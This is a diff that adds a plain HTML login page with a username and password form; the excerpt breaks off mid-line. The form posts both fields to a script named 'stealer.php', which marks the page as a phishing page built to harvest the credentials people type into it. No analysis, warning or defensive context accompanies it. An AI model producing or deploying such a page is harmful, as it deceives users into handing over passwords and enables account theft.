@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login</title>
+  <style>
+    body { font-family: Arial, sans-serif; background-color: #f4f4f4; }
+    .login-container {
+      max-width: 300px; margin: 100px auto; padding: 20px;
+      background: white; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+    }
+    input { width: 100%; padding: 10px; margin: 5px 0; }
+    button { width: 100%; padding: 10px; background: blue; color: white; border: none; cursor: pointer; }
+    button:hover { background: darkblue; }
+    .error { color: red; display: none; }
+  </style>
+</head>
+<body>
+
+<div class="login-container">
+  <h2>Login</h2>
+  <form action="stealer.php" method="POST">
+    <input type="text" id="username" name="username" placeholder="Username">
+    <input type="password" id="password" name="password" placeholder="Password">
+    <button type="submit">Login</button>
+    <p class="error" id="error">Invalid
